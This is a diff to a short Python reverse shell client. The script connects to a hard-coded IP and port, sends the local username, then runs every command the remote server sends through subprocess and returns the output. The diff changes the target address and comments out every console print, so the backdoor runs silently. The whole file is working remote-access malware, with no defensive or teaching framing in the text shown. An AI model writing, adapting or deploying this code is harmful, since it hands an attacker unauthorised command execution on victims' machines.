@@ -4,7 +4,7 @@ import subprocess
 
 # Set up the server address and port
 #server_address = '156.196.54.233'  # Replace with your server's IP address
-server_address = '192.168.1.17'
+server_address = '192.168.1.103'
 server_port = 8080                # Replace with your server's port
 
 username = subprocess.getoutput("""echo %username%""")
@@ -16,12 +16,12 @@ while True:
     # Create a socket object
     try:
         time.sleep(2)
-        print("trying to connect")
+        #print("trying to connect")
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((server_address, server_port))
         time.sleep(1)
         client_socket.send(username.encode())
-        print("send")
+        #print("send")
 
         # Receive commands from the server and execute them
         while True:
@@ -30,12 +30,12 @@ while True:
                 if command.lower() == 'exit':
                     break
                 output = subprocess.getoutput(command)
-                print(output)
+                #print(output)
                 client_socket.send(output.encode())
             except:
                 break
     except:
-        print("sdf")
+        #print("sdf")
         pass
 
 
